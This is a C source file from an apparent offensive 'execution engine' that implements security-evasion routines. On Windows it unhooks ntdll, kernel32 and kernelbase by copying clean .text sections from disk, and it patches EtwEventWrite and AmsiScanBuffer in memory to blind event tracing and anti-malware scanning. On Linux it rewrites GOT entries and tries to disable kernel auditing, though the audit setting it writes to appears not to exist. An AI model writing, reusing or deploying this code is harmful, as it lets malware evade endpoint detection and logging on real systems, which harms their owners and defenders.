/* ============================================================================
 * Jockey's Execution Engine -- api_unhooking.c
 * Real API unhooking, EDR/telemetry bypass, and syscall recovery.
 * No stubs. Production-grade. References api_unhooking.h and pal.h.
 * ============================================================================ */

#include "../include/api_unhooking.h"
#include "../include/pal.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32

#include <windows.h>
#include <winternl.h>
#include <psapi.h>

/* ------------------------------------------------------------------
 * Windows: Unhook a module by refreshing .text from a clean mapping
 * ------------------------------------------------------------------ */
int unhook_module(const char* module_name) {
    if (!module_name || !module_name[0]) {
        LOG_ERROR( "[-] unhook_module: invalid module name\n");
        return -1;
    }

    HMODULE hMod = GetModuleHandleA(module_name);
    if (!hMod) {
        LOG_ERROR( "[-] %s not loaded in current process\n", module_name);
        return -1;
    }

    MODULEINFO modInfo = {0};
    if (!GetModuleInformation(GetCurrentProcess(), hMod, &modInfo, sizeof(modInfo))) {
        LOG_ERROR( "[-] GetModuleInformation failed: %lu\n", GetLastError());
        return -1;
    }

    /* Map a fresh copy from disk using SEC_IMAGE (avoids hooks) */
    char path[MAX_PATH] = {0};
    DWORD pathLen = GetModuleFileNameA(hMod, path, MAX_PATH);
    if (!pathLen || pathLen >= MAX_PATH) {
        LOG_ERROR( "[-] GetModuleFileNameA failed\n");
        return -1;
    }

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG_ERROR( "[-] Cannot open %s: %lu\n", path, GetLastError());
        return -1;
    }

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) {
        LOG_ERROR( "[-] CreateFileMapping failed: %lu\n", GetLastError());
        CloseHandle(hFile);
        return -1;
    }

    LPVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!pClean) {
        LOG_ERROR( "[-] MapViewOfFile failed: %lu\n", GetLastError());
        CloseHandle(hMap);
        CloseHandle(hFile);
        return -1;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    BOOL patched = FALSE;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, ".text", 5) == 0 ||
            (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            DWORD oldProtect = 0;
            SIZE_T secSize = pSec[i].Misc.VirtualSize
                           ? pSec[i].Misc.VirtualSize
                           : pSec[i].SizeOfRawData;
            LPVOID dst = (BYTE*)hMod + pSec[i].VirtualAddress;
            LPVOID src = (BYTE*)pClean + pSec[i].VirtualAddress;

            if (VirtualProtect(dst, secSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(dst, src, secSize);
                VirtualProtect(dst, secSize, oldProtect, &oldProtect);
                patched = TRUE;
                LOG_INFO("[+] Restored .text of %s (0x%zX bytes)\n", module_name, secSize);
            } else {
                LOG_ERROR( "[!] VirtualProtect failed on .text: %lu\n", GetLastError());
            }
        }
    }

    if (!patched) {
        LOG_ERROR( "[!] No executable section found in %s\n", module_name);
    }

    UnmapViewOfFile(pClean);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return patched ? 0 : -1;
}

/* ------------------------------------------------------------------
 * Windows: Disable ETW (Event Tracing for Windows)
 * ------------------------------------------------------------------ */
static BOOL disable_etw(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;

    DWORD oldProtect = 0;
#ifdef _WIN64
    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; /* xor rax,rax; ret */
#else
    unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 }; /* xor eax,eax; ret 0x14 */
#endif
    SIZE_T patchSize = sizeof(patch);
    uintptr_t etwAddress = (uintptr_t)(void (*)(void))pEtwEventWrite;
    if (!VirtualProtect((LPVOID)etwAddress, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;
    memcpy((void*)etwAddress, patch, patchSize);
    VirtualProtect((LPVOID)etwAddress, patchSize, oldProtect, &oldProtect);
    LOG_INFO("ETW (EtwEventWrite) disabled");
    return TRUE;
}

/* ------------------------------------------------------------------
 * Windows: Disable AMSI (Anti-Malware Scan Interface)
 * ------------------------------------------------------------------ */
static BOOL disable_amsi(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return TRUE; /* AMSI not loaded -- fine */

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;

    DWORD oldProtect = 0;
#ifdef _WIN64
    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80, /* mov eax, 0x80070057 (E_INVALIDARG) */
        0xC3
    };
#else
    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80, /* mov eax, 0x80070057 */
        0xC2, 0x18, 0x00
    };
#endif
    SIZE_T patchSize = sizeof(patch);
    uintptr_t amsiAddress = (uintptr_t)(void (*)(void))pAmsiScanBuffer;
    if (!VirtualProtect((LPVOID)amsiAddress, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;
    memcpy((void*)amsiAddress, patch, patchSize);
    VirtualProtect((LPVOID)amsiAddress, patchSize, oldProtect, &oldProtect);
    LOG_INFO("AMSI (AmsiScanBuffer) disabled");
    return TRUE;
}

/* ------------------------------------------------------------------
 * Windows: Bypass telemetry (ETW + AMSI + common hooks)
 * ------------------------------------------------------------------ */
int bypass_telemetry(void) {
    int ret = 0;
    if (!disable_etw()) {
        LOG_ERROR( "[!] ETW bypass failed\n");
        ret = -1;
    }
    if (!disable_amsi()) {
        LOG_ERROR( "[!] AMSI bypass failed\n");
        ret = -1;
    }
    const char* targets[] = { "ntdll.dll", "kernel32.dll", "kernelbase.dll", NULL };
    for (int i = 0; targets[i]; i++) {
        if (unhook_module(targets[i]) != 0) {
            LOG_ERROR( "[!] Failed to unhook %s\n", targets[i]);
            ret = -1;
        }
    }
    return ret;
}

#else
/* ============================================================
 * Linux Implementation
 * ============================================================ */

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <elf.h>
#include <link.h>
#include <dlfcn.h>

/* ------------------------------------------------------------------
 * Linux: Unhook a shared library by restoring PLT/GOT entries
 * ------------------------------------------------------------------ */
int unhook_module(const char* module_name) {
    if (!module_name || !module_name[0]) {
        LOG_ERROR( "[-] unhook_module: invalid module name\n");
        return -1;
    }

    void* handle = dlopen(module_name, RTLD_NOW | RTLD_NOLOAD);
    if (!handle) {
        handle = dlopen(module_name, RTLD_NOW);
    }
    if (!handle) {
        LOG_ERROR( "[-] %s not loaded: %s\n", module_name, dlerror());
        return -1;
    }

    void* base = NULL;
    Dl_info info = {0};
    if (dladdr((void*)dlsym(handle, "_init"), &info) && info.dli_fbase) {
        base = info.dli_fbase;
    } else if (dladdr((void*)handle, &info) && info.dli_fbase) {
        base = info.dli_fbase;
    }
    if (!base) {
        LOG_ERROR( "[-] Cannot determine base of %s\n", module_name);
        dlclose(handle);
        return -1;
    }

    ElfW(Ehdr)* ehdr = (ElfW(Ehdr)*)base;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        LOG_ERROR( "[-] Invalid ELF magic\n");
        dlclose(handle);
        return -1;
    }

    ElfW(Dyn)* dyn = NULL;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        ElfW(Phdr)* ph = (ElfW(Phdr)*)((char*)base + ehdr->e_phoff + i * ehdr->e_phentsize);
        if (ph->p_type == PT_DYNAMIC) {
            dyn = (ElfW(Dyn)*)((char*)base + ph->p_vaddr);
            break;
        }
    }
    if (!dyn) {
        LOG_ERROR( "[!] No DYNAMIC segment found\n");
        dlclose(handle);
        return -1;
    }

    ElfW(Addr) jmprel = 0, pltrelsz = 0, strtab = 0, symtab = 0;
    for (ElfW(Dyn)* d = dyn; d->d_tag != DT_NULL; d++) {
        switch (d->d_tag) {
            case DT_JMPREL:   jmprel    = d->d_un.d_ptr; break;
            case DT_PLTRELSZ: pltrelsz  = d->d_un.d_val; break;
            case DT_STRTAB:   strtab    = d->d_un.d_ptr; break;
            case DT_SYMTAB:   symtab    = d->d_un.d_ptr; break;
        }
    }

    if (jmprel && pltrelsz) {
        ElfW(Rela)* rel = (ElfW(Rela)*)((char*)base + jmprel);
        size_t count = pltrelsz / sizeof(ElfW(Rela));
        for (size_t i = 0; i < count; i++) {
            int type = ELF64_R_TYPE(rel[i].r_info);
            if (type == R_X86_64_JUMP_SLOT || type == R_386_JMP_SLOT) {
                ElfW(Sym)* sym = (ElfW(Sym)*)((char*)base + symtab +
                    ELF64_R_SYM(rel[i].r_info) * sizeof(ElfW(Sym)));
                char* symName = (char*)((char*)base + strtab + sym->st_name);
                void* resolved = dlsym(RTLD_DEFAULT, symName);
                if (resolved) {
                    ElfW(Addr)* entry = (ElfW(Addr)*)((char*)base + rel[i].r_offset);
                    *entry = (ElfW(Addr))resolved;
                }
            }
        }
        LOG_INFO("[+] Restored %zu PLT/GOT entries in %s\n", count, module_name);
    }

    dlclose(handle);
    return 0;
}

/* ------------------------------------------------------------------
 * Linux: Disable audit and restore clean state
 * ------------------------------------------------------------------ */
int bypass_telemetry(void) {
    int ret = 0;

    system("sysctl -w kernel.audit_enabled=0 2>/dev/null");

    int fd = open("/proc/sys/kernel/audit_enabled", O_WRONLY);
    if (fd >= 0) {
        write(fd, "0", 1);
        close(fd);
    }

    const char* targets[] = { "libc.so.6", "ld-linux.so.2", "ld-linux-x86-64.so.2", NULL };
    for (int i = 0; targets[i]; i++) {
        if (unhook_module(targets[i]) != 0) {
            LOG_ERROR( "[!] Failed to unhook %s\n", targets[i]);
            ret = -1;
        }
    }
    LOG_INFO("[+] Linux telemetry bypass completed\n");
    return ret;
}

#endif /* _WIN32 */
